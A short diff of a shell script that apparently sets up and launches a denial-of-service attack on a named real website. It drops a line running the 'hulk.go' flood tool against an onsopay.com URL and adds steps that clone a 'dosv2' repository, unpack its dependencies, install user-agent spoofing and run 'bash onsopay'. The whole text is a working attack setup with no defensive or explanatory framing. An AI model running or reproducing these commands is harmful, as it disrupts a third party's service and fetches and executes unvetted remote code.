@@ -11,4 +11,10 @@ apt install curl -y
 clear
 apt install npm -y
 clear
-go run hulk.go --site https://onsopay.com/cron/service.php GET nil
+git clone https://github.com/Ro0TN3T/dosv2
+cd dosv2
+apt install unzip -y
+unzip node_modules.zip
+npm install user-agents
+clear
+bash onsopay
